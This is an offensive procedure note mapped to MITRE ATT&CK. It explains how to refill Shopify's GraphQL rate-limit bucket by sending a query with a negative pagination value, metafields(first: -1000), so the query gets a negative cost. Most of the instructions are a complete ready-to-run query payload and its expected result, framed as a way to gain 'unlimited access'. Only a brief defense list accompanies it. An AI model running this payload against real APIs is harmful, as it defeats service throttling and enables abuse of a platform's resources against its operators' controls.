---
tags:
  - graphql
  - shopify
  - negative-cost-refill
type: procedure
tools:
  - '[[tools/Shopify-GraphiQL-App]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/negative-cost-appinstallations-query]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:53.309Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 1901790f-471c-4ba8-85cb-cab95b8f91de
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Refill-Shopify-GraphQL-Bucket-with-Negative-Query-Cost

## Summary

After depletion, execute a modified GraphQL query with a large negative 'first' value (e.g., -1000) to incur a negative cost, refilling the rate limit bucket to its maximum of 1000 points.

## Description

By altering a high-cost query to include first: -1000 in one pagination field, the API calculates a negative overall cost due to the business logic error. This adds points back to the bucket, bypassing the intended throttling and allowing continued abuse.

## Requirements

1. Depleted bucket from prior procedure
2. GraphiQL app session active
3. Familiarity with query modification

## Defense

Defensive measures and detection strategies:

- Validate all integer parameters to be positive only
- Reject queries with negative pagination values at the parser level
- Monitor for bucket point increases as anomalies

## Objectives

1. Restore bucket to 1000 points via negative cost
2. Confirm no data validation blocks the query
3. Enable subsequent unlimited access

## Instructions

### Step 1: Modify Query for Negative Cost

**Context**: Change one 'first' parameter in the high-cost query to a large negative.

**Command** ([[commands/negative-cost-appinstallations-query]]):
```graphql
{
  appInstallations(first: 10) {
    edges {
      node {
        id
        uninstallUrl
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        launchUrl
        app {
          pricingDetailsSummary
          apiKey
          banner {
            altText
            metafields(first: -1000) {
              edges {
                node {
                  description
                  value
                  namespace
                  id
                }
              }
            }
          }
        }
        handle
        features
        pricingDetails
        published
        feedback {
          messages {
            message
          }
          link {
            url
          }
        }
      }
    }
  }
}
```

> The negative in metafields(first: -1000) causes overall negative cost.

### Step 2: Execute and Verify Refill

**Context**: Run the query and check bucket status.

Execute in GraphiQL.

> Expected: Cost negative (e.g., -950), bucket back to 1000.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/negative-cost-appinstallations-query]]

## Tools Used

- [[tools/Shopify-GraphiQL-App]]

## Tags

- graphql
- shopify
- negative-cost-refill
